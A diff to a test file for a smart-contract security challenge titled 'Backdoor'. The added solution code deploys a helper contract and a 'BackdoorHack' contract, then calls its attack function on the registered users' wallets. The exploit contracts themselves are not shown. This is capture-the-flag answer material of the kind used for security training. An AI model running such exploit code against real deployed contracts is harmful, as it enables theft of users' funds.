@@ -46,6 +46,12 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        [, , , , , , thirdPerson] = await ethers.getSigners();
+        const ContractForApproveFactory = await ethers.getContractFactory('ContractForApprove', thirdPerson);
+        const contractForApprove = await ContractForApproveFactory.deploy();
+        const BackdoorHackFactory = await ethers.getContractFactory('BackdoorHack', thirdPerson);
+        const backdoorHack = await BackdoorHackFactory.deploy(player.address, masterCopy.address, walletFactory.address, token.address, walletRegistry.address, contractForApprove.address);
+        await backdoorHack.connect(player).attack(users);
     });
 
     after(async function () {
